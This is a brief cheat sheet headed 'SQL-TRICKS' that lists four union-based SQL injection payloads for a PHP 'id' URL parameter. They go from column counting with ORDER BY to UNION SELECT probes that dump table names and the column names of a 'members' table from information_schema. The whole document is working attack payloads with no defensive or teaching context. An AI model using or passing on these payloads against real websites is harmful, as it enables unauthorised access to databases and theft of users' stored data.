# SQL-TRICKS

```
.php?id=4 order by 5

.php?id=-4 union select 1,2,3,4

.php?id=-4 union select 1,GROUP_CONCAT(DATABASE()),3,group_concat(table_name) from information_schema.tables where table_schema=database()

.php?id=-4 union select 1,GROUP_CONCAT(DATABASE()),3,group_concat(column_name) from information_schema.columns where table_name='members'
```
